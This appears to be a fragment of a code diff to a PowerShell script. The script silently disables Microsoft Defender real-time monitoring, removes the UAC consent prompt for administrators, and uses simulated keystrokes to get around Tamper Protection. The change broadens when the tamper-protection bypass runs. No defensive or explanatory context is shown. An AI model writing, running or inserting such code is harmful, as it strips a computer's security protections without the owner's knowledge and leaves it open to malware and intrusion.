@@ -5,7 +5,7 @@ Set-MpPreference -DisableRealtimeMonitoring 1 -ErrorAction SilentlyContinue
     Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
     #disable tamper protection
 $TamperProtectionEnabled = (Get-MpPreference).TamperProtection
-if ($TamperProtectionEnabled -eq 1) {
+if ($TamperProtectionEnabled -eq 1 -or [string]::IsNullOrEmpty($TamperProtectionEnabled)) {
         $shell = New-Object -ComObject WScript.Shell
 $shell.SendKeys("^{ESC}")
 Start-Sleep -Seconds 1
